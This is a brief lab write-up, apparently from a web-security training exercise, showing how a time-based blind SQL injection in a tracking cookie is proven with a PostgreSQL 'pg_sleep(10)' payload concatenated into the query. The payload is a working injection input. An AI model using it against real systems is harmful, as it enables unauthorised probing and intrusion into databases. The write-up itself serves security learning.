**Blind SQL Injection with time delays**

*Vulnerable parameter - tracking cookie*

*-Goal:*prove that the field is vulnerable to blind SQLi (time based)

Analysis:

`select tracking-id from tracking-table where trackingid='ubqO82NDALvbUxA4'|| (SELECT pg_sleep(10))--'`

*`LAB SOLVED`*
